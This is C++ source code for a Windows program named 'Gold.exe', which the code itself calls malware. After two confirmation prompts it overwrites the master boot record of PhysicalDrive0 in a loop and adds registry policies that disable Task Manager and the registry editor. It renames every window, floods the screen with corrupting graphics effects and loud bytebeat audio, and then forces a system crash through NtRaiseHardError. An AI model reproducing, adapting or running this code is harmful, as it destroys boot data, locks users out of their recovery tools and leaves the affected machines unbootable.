#include <windows.h>
#include <cmath>
#define _USE_MATH_DEFINES 1
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

typedef union _RGBQUAD {
    COLORREF rgb;
    struct {
        BYTE r;
        BYTE g;
        BYTE b;
        BYTE Reserved;
    };
}_RGBQUAD, *PRGBQUAD;

const unsigned char MasterBootRecord[] = {
0xB8, 0x13, 0x00, 0xCD, 0x10, 0xB0, 0x04, 0xE8, 0x15, 0x00, 0xE8, 0x24, 0x00, 0xB0, 0x02, 0xE8, 
0x0D, 0x00, 0xE8, 0x1C, 0x00, 0xB0, 0x01, 0xE8, 0x05, 0x00, 0xE8, 0x14, 0x00, 0xEB, 0xE6, 0x50, 
0x57, 0xBF, 0x00, 0xA0, 0x8E, 0xC7, 0x31, 0xFF, 0xB9, 0x00, 0xFA, 0xAA, 0xE2, 0xFD, 0x5F, 0x58, 
0xC3, 0xB9, 0x00, 0x00, 0xBA, 0x00, 0x00, 0x4A, 0x75, 0xFD, 0x49, 0x75, 0xF7, 0xC3, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};

DWORD WINAPI mbr(LPVOID lpParam) {
    while(1) {
        DWORD dwBytesWritten;
        HANDLE hDisk = CreateFileW(
            L"\\\\.\\PhysicalDrive0",
            GENERIC_ALL,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            0, OPEN_EXISTING, 0, 0
        );
        WriteFile(hDisk, MasterBootRecord, 512, &dwBytesWritten, 0);
        CloseHandle(hDisk);
    }
}

DWORD WINAPI disabletaskmgr(LPVOID lpParam) {
    system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
    return 1;
}

DWORD WINAPI disableRegistry(LPVOID lpParam) {
    system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableRegistryTool /t reg_dword /d 1 /f");
    return 2;
}

DWORD WINAPI childWin(LPVOID lpParam) {
    while(1) {
        BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam);
        EnumChildWindows(GetDesktopWindow(), &EnumChildProc, NULL);
    }
}

BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
    SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)L"Gold.exe", SMTO_ABORTIFHUNG, 100, NULL);
    return true;
}

DWORD WINAPI CubeColorHalf(LPVOID lpParam) {
    while(1) {
        HDC hdc = GetDC(0);
        int x = GetSystemMetrics(0);
        int y = GetSystemMetrics(1);
        HBRUSH brush = CreateSolidBrush(RGB(255, 255, 0));
        SelectObject(hdc, brush);
        PatBlt(hdc, 0, 0, rand() % x, rand() % y, PATINVERT);
        DeleteObject(brush);
        ReleaseDC(0, hdc);
        DeleteDC(hdc);
        Sleep(10);
    }
}

DWORD WINAPI Light(LPVOID lpParam) {
    while(1) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BitBlt(hdc, 1, 0, w, h, hdc, 0, 0, SRCPAINT);
        BitBlt(hdc, -1, 0, w, h, hdc, 0, 0, SRCPAINT);
        BitBlt(hdc, 0, 1, w, h, hdc, 0, 0, SRCPAINT);
        BitBlt(hdc, 0, -1, w, h, hdc, 0, 0, SRCPAINT);
        ReleaseDC(0, hdc);
        DeleteDC(hdc);
        Sleep(10);
    }
}

DWORD WINAPI sines(LPVOID lpParam) {
    double angle = 0;
    while(1) {
        HDC hdc = GetDC(0);
        int sw = GetSystemMetrics(0);
        int sh = GetSystemMetrics(1);
        HBRUSH brush = CreateSolidBrush(RGB(255, 255, 0));
        SelectObject(hdc, brush);
        for (float i = 0; i < sw + sh; i += 0.99f) {
             int a = sin(angle) * 20;
             BitBlt(hdc, 0, i, sw, 1, hdc, a, i, SRCCOPY);
             BitBlt(hdc, 0, i, sw, 1, hdc, a, i, PATINVERT);
             BitBlt(hdc, i, 0, 1, sh, hdc, i, a, SRCCOPY);
             BitBlt(hdc, i, 0, 1, sh, hdc, i, a, PATINVERT);
             angle += M_PI / 40;
             DeleteObject(&i);
             DeleteObject(&a);
        }
        DeleteObject(brush);
        ReleaseDC(0, hdc);
        DeleteDC(hdc);
        DeleteObject(&sw);
        DeleteObject(&sh);
        DeleteObject(&angle);
        Sleep(10);
    }
}

DWORD WINAPI RanTunnel(LPVOID lpParam) {
    while(1) {
        HDC hdc = GetDC(0);
        int sw = GetSystemMetrics(0);
        int sh = GetSystemMetrics(1);
        StretchBlt(hdc, 0, 0, rand() % sw, rand() % sh, hdc, 0, 0, sw, sh, SRCCOPY);
        ReleaseDC(0, hdc);
        DeleteDC(hdc);
        Sleep(10);
    }
}

DWORD WINAPI WeirdInvert(LPVOID lpParam) {
    while(1) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BitBlt(hdc, 1, 1, w, h, hdc, 0, 0, SRCINVERT);
        BitBlt(hdc, -1, -1, w, h, hdc, 0, 0, SRCINVERT);
        ReleaseDC(0, hdc);
        DeleteDC(hdc);
        Sleep(10);
    }
}

DWORD WINAPI flashPixels(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    HDC hdcMem = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    HBITMAP hbmTemp = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
    SelectObject(hdcMem, hbmTemp);
    for (;;) {
         hdc = GetDC(0);
         BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
         for (int i = 0; i < w * h; i++) {
              rgbScreen[i].rgb += 360;
         }
         BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
         ReleaseDC(0, hdc);
         DeleteDC(hdc);
    }
}

DWORD WINAPI balls(LPVOID lpParam) {
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    int signX = 1;
    int signY = 1;
    int signX1 = 1;
    int signY1 = 1;
    int incrementor = 10;
    int x = 10;
    int y = 10;
    while(1) {
        HDC hdc = GetDC(0);
        int top_x = 0 + x;
        int top_y = 0 + y;
        int bottom_x = 100 + x;
        int bottom_y = 100 + y;
        x += incrementor * signX;
        y += incrementor * signY;
        HBRUSH brush = CreateSolidBrush(RGB(255, 255, 0));
        SelectObject(hdc, brush);
        Ellipse(hdc, top_x, top_y, bottom_x, bottom_y);
        if (y >= GetSystemMetrics(SM_CYSCREEN)) {
            signY = -1;
        }

        if (x >= GetSystemMetrics(SM_CXSCREEN)) {
            signX = -1;
        }

        if (y == 0) {
            signY = 1;
        }

        if (x == 0) {
            signX = 1;
        }
        Sleep(10);
        DeleteObject(brush);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI noise(LPVOID lpParam) {
    while(1) {
        HDC hdc = GetDC(0);
        int sw = GetSystemMetrics(0);
        int sh = GetSystemMetrics(1);
        BitBlt(hdc, rand() % 10, rand() % 10, sw, sh, hdc, rand() % 10, rand() % 10, SRCINVERT);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI glitch(LPVOID lpParam) {
    while(1) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        StretchBlt(hdc, 10, 10, w - 20, h - 20, hdc, 0, 0, w, h, SRCINVERT);
        StretchBlt(hdc, -10, -10, w + 20, h + 20, hdc, 0, 0, w, h, SRCINVERT);
        ReleaseDC(0, hdc);
    }
}

VOID WINAPI sound1() {
   HWAVEOUT hWaveOut = 0;
   WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
   waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
   char buffer[8000 * 30] = {};
   for (DWORD t = 0; t < sizeof(buffer); ++t) {
        buffer[t] = static_cast<char>(10*(t&5*t|t>>6|(t&32768?-6*t/7:(t&65536?-9*t&100:-9*(t&100))/11)));
   }

   WAVEHDR header = { buffer, sizeof(buffer) };
   waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutClose(hWaveOut);
}

VOID WINAPI sound2() {
   HWAVEOUT hWaveOut = 0;
   WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
   waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
   char buffer[8000 * 30] = {};
   for (DWORD t = 0; t < sizeof(buffer); ++t) {
        buffer[t] = static_cast<char>(t*(4|t>>13&3)>>(~t>>11&1)&128|t*(t>>11&t>>13)*(~t>>9&3)&127);
   }

   WAVEHDR header = { buffer, sizeof(buffer) };
   waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutClose(hWaveOut);
}

VOID WINAPI sound3() {
   HWAVEOUT hWaveOut = 0;
   WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
   waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
   char buffer[8000 * 30] = {};
   for (DWORD t = 0; t < sizeof(buffer); ++t) {
        buffer[t] = static_cast<char>(t>>6&1?t>>5:-t>>4);
   }

   WAVEHDR header = { buffer, sizeof(buffer) };
   waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutClose(hWaveOut);
}

VOID WINAPI sound4() {
   HWAVEOUT hWaveOut = 0;
   WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
   waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
   char buffer[8000 * 30] = {};
   for (DWORD t = 0; t < sizeof(buffer); ++t) {
        buffer[t] = static_cast<char>(t*(t>>12)*64+(t>>1)*(t>>10)*(t>>11)*48>>((t>>16|t>>17)&1));
   }

   WAVEHDR header = { buffer, sizeof(buffer) };
   waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutClose(hWaveOut);
}

VOID WINAPI sound5() {
   HWAVEOUT hWaveOut = 0;
   WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
   waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
   char buffer[8000 * 30] = {};
   for (DWORD t = 0; t < sizeof(buffer); ++t) {
        buffer[t] = static_cast<char>(2*t^2*t+(t>>7)&t>>12|t>>4-(1^7&t>>19)|t>>7);
   }

   WAVEHDR header = { buffer, sizeof(buffer) };
   waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutClose(hWaveOut);
}

VOID WINAPI sound6() {
   HWAVEOUT hWaveOut = 0;
   WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
   waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
   char buffer[8000 * 30] = {};
   for (DWORD t = 0; t < sizeof(buffer); ++t) {
        buffer[t] = static_cast<char>(t*((t>>12|t>>8)&63&t>>4));
   }

   WAVEHDR header = { buffer, sizeof(buffer) };
   waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutClose(hWaveOut);
}

VOID WINAPI sound7() {
   HWAVEOUT hWaveOut = 0;
   WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
   waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
   char buffer[8000 * 30] = {};
   for (DWORD t = 0; t < sizeof(buffer); ++t) {
        buffer[t] = static_cast<char>(t*(t>>8*(t>>15|t>>8)&(20|5*(t>>19)>>t|t>>3)));
   }

   WAVEHDR header = { buffer, sizeof(buffer) };
   waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutClose(hWaveOut);
}

int main() {
    if (MessageBoxW(NULL, L"Run?", L"Gold.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
        ExitProcess(0);
    } else {
        if (MessageBoxW(NULL, L"Are you sure? it will absolutely cooked your PC\nbut remember that i am NOT responsible for any damage caused by this malware.", L"Gold.exe - LAST WARNING", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
            ExitProcess(0);
        } else {
            CreateThread(0, 0, mbr, 0, 0, 0);
            CreateThread(0, 0, disabletaskmgr, 0, 0, 0);
            CreateThread(0, 0, disableRegistry, 0, 0, 0);
            Sleep(2000);
            HANDLE thread0 = CreateThread(0, 0, childWin, 0, 0, 0);
            HANDLE thread1 = CreateThread(0, 0, CubeColorHalf, 0, 0, 0);
            sound1();
            Sleep(30000);
            TerminateThread(thread1, 0);
            CloseHandle(thread1);
            Sleep(100);
            HANDLE thread2 = CreateThread(0, 0, Light, 0, 0, 0);
            sound2();
            Sleep(30000);
            TerminateThread(thread2, 0);
            CloseHandle(thread2);
            Sleep(100);
            HANDLE thread3 = CreateThread(0, 0, RanTunnel, 0, 0, 0);
            HANDLE thread3dot0 = CreateThread(0, 0, sines, 0, 0, 0);
            sound3();
            Sleep(30000);
            TerminateThread(thread3, 0);
            CloseHandle(thread3);
            TerminateThread(thread3dot0, 0);
            CloseHandle(thread3dot0);
            Sleep(100);
            HANDLE thread4 = CreateThread(0, 0, WeirdInvert, 0, 0, 0);
            sound4();
            Sleep(30000);
            TerminateThread(thread4, 0);
            CloseHandle(thread4);
            Sleep(100);
            HANDLE thread5 = CreateThread(0, 0, flashPixels, 0, 0, 0);
            sound5();
            Sleep(30000);
            TerminateThread(thread5, 0);
            CloseHandle(thread5);
            Sleep(100);
            HANDLE thread6 = CreateThread(0, 0, noise, 0, 0, 0);
            HANDLE thread6dot1 = CreateThread(0, 0, balls, 0, 0, 0);
            sound6();
            Sleep(30000);
            TerminateThread(thread6, 0);
            CloseHandle(thread6);
            Sleep(100);
            HANDLE thread7 = CreateThread(0, 0, glitch, 0, 0, 0);
            sound7();
            Sleep(30000);
            BOOLEAN bl;
            DWORD response;
            NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
            RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
            RtlAdjustPrivilege(19, 1, 0, &bl);
            NtRaiseHardError(0xC0000006, 0, 0, 0, 6, &response);
            Sleep(-1);
        }
    }
}